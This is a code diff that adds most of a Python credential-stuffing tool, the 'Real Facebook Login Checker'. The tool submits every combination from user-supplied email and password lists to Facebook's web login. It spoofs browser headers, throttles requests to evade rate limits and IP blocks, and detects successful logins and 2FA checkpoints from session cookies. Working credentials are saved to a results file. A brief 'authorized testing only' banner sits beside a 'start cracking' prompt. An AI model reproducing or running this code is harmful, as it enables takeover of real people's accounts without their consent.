@@ -131,4 +131,194 @@ def check_login_real(email, password):
     # Step 2: Submit login
     headers2 = {
         'User-Agent': random_ua(),
-        '
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Origin': 'https://www.facebook.com',
+        'DNT': '1',
+        'Referer': 'https://www.facebook.com/',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-User': '?1',
+    }
+    
+    data = {
+        'lsd': lsd,
+        'jazoest': jazoest,
+        'email': email,
+        'pass': password,
+        'login_source': 'comet_headerless',
+        'next': '',
+        'enc': '',
+        'cpl': '1',
+    }
+    
+    # Response cookies check karne se pehle
+    try:
+        resp = session.post(action_url, data=data, headers=headers2, allow_redirects=False, timeout=15)
+    except Exception as e:
+        return "ERROR", str(e)
+    
+    # --- ANALYSIS ---
+    # Check cookies for successful login
+    c_user = session.cookies.get('c_user')
+    xs = session.cookies.get('xs')
+    sessionid = session.cookies.get('sessionid')
+    
+    if c_user and c_user.isdigit():
+        # Login successful!
+        user_id = c_user
+        
+        if 'checkpoint' in str(resp.headers.get('Location', '')):
+            return "2FA", f"{email}|{password} (2FA Required, ID: {user_id})"
+        else:
+            return "HIT", f"{email}|{password} (ID: {user_id})"
+    
+    elif resp.status_code == 302:
+        location = resp.headers.get('Location', '')
+        
+        if 'checkpoint' in location:
+            # 2FA checkpoint
+            return "2FA", f"{email}|{password} (2FA Checkpoint)"
+        elif 'home.php' in location or 'facebook.com/' in location:
+            # Might be success - check cookies more
+            if 'sessionid' in session.cookies or 'c_user' in session.cookies:
+                return "HIT", f"{email}|{password} (Cookie found)"
+        
+        return "WRONG", "Wrong password / Redirect"
+    
+    elif 'checkpoint' in resp.text or 'two-factor' in resp.text.lower():
+        return "2FA", f"{email}|{password} (2FA detected in page)"
+    
+    elif 'Please try again' in resp.text or 'incorrect' in resp.text.lower():
+        return "WRONG", "Wrong password"
+    
+    elif 'blocked' in resp.text.lower() or 'suspicious' in resp.text.lower():
+        return "BLOCKED", f"{email}|{password} (Rate limited / Blocked)"
+    
+    elif 'c_user' in str(session.cookies):
+        return "HIT", f"{email}|{password} (Session cookie)"
+    
+    # Default: probably wrong password
+    return "WRONG", "Unknown result (likely wrong password)"
+
+
+# ============================================================
+# WORKER FUNCTION (runs in thread pool)
+# ============================================================
+def worker(email, password):
+    """Single worker that checks one email+password combination"""
+    global attempted, hits
+    
+    try:
+        status, details = check_login_real(email, password)
+        
+        result_line = f"[{status}] {email}:{password} | {details}\n"
+        
+        if status == "HIT":
+            hits.append(f"{email}|{password}")
+            # Save immediately
+            with open(RESULT_FILE, 'a') as f:
+                f.write(f"[HIT] {email}|{password}\n")
+            # Color output
+            sys.stdout.write(f"\r{G}[✓] HIT! {email}:{password}{RESET}\n")
+        elif status == "2FA":
+            hits.append(f"{email}|{password} (2FA)")
+            with open(RESULT_FILE, 'a') as f:
+                f.write(f"[2FA] {email}|{password}\n")
+            sys.stdout.write(f"\r{M}[2FA] {email}:{password} - 2FA Required{RESET}\n")
+        elif status == "BLOCKED":
+            sys.stdout.write(f"\r{R}[BLOCKED] {email} - Rate limited{RESET}\n")
+        elif status == "WRONG":
+            # Only show progress, not every wrong attempt
+            pass
+        else:
+            sys.stdout.write(f"\r{Y}[{status}] {email}:{password}{RESET}\n")
+        
+    except Exception as e:
+        pass
+
+
+# ============================================================
+# MAIN FUNCTION
+# ============================================================
+def main():
+    global attempted, total_attempts, hits
+    
+    print(f"\n{C}{'='*60}{RESET}")
+    print(f"{C}   REAL FACEBOOK LOGIN CHECKER (Web Login){RESET}")
+    print(f"{C}   User-Provided ID & Password Lists{RESET}")
+    print(f"{C}{'='*60}{RESET}")
+    print(f"{Y}   ⚠️  This tool is for AUTHORIZED testing only{RESET}")
+    print(f"{C}{'='*60}{RESET}\n")
+    
+    # Load files
+    ids = load_file(ID_FILE, "IDs")
+    passwords = load_file(PASS_FILE, "Passwords")
+    
+    print(f"\n{B}{'─'*50}{RESET}")
+    print(f"{Y}ID List        : {len(ids)} IDs{RESET}")
+    print(f"{Y}Password List  : {len(passwords)} passwords{RESET}")
+    print(f"{Y}Total Attempts : {len(ids) * len(passwords)}{RESET}")
+    print(f"{Y}Results will save to: {RESULT_FILE}{RESET}")
+    print(f"{B}{'─'*50}{RESET}\n")
+    
+    # Build all combinations
+    combinations = []
+    for uid in ids:
+        for pw in passwords:
+            combinations.append((uid.strip(), pw.strip()))
+    
+    total_attempts = len(combinations)
+    
+    input(f"{G}[Press Enter to start cracking...]{RESET}\n")
+    
+    print(f"{C}[*] Starting... press Ctrl+C to stop anytime{RESET}\n")
+    
+    # Check if RESULT_FILE exists, clear it if it does
+    if os.path.exists(RESULT_FILE):
+        os.remove(RESULT_FILE)
+    
+    # Start time
+    global start_time
+    start_time = datetime.now()
+    
+    # Thread pool
+    max_threads = 5  # Low threads to avoid IP block
+    with ThreadPoolExecutor(max_workers=max_threads) as executor:
+        futures = []
+        for email, pw in combinations:
+            attempted += 1
+            futures.append(executor.submit(worker, email, pw))
+            time.sleep(random.uniform(1.0, 2.5))  # Delay between each attempt
+        
+        # Wait for all to complete
+        for future in as_completed(futures):
+            pass
+    
+    # Summary
+    elapsed = datetime.now() - start_time
+    print(f"\n\n{G}{'='*60}{RESET}")
+    print(f"{G}   Cracking Complete!{RESET}")
+    print(f"{C}   Total Attempted : {attempted}{RESET}")
+    print(f"{G}   Total Hits      : {len(hits)}{RESET}")
+    print(f"{Y}   Time Elapsed    : {elapsed}{RESET}")
+    print(f"{G}   Results saved   : {RESULT_FILE}{RESET}")
+    print(f"{C}{'='*60}{RESET}")
+    
+    if hits:
+        print(f"\n{G}=== HITS ==={RESET}")
+        for h in hits:
+            print(f"{G}{h}{RESET}")
+
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{Y}[!] Stopped by user{RESET}")
+        elapsed = datetime.now() - start_time
+        print(f"{C}Attempted: {attempted} | Hits: {len(hits)} | Time: {elapsed}{RESET}")
